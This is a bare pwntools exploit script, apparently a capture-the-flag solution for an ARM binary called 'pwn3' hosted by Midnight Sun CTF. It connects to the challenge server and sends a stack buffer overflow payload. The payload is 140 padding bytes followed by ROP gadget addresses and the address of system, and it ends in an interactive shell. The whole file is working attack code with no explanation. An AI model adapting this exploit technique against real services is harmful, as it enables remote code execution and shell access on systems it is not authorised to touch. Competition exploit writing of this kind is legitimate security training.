from pwn import *


HOST, PORT = 'pwn3-01.play.midnightsunctf.se', 10003

#p = process(["qemu-arm-static","-g","12345", "./pwn3"])
p = remote(HOST, PORT)

system = 0x14b5d

payload = b'A' * 140
payload += p32(0x0001fb5c)
payload += p32(0x00049018) 
payload += p32(0xdead)
payload += p32(system)

p.sendlineafter('buffer:', payload)
p.interactive()
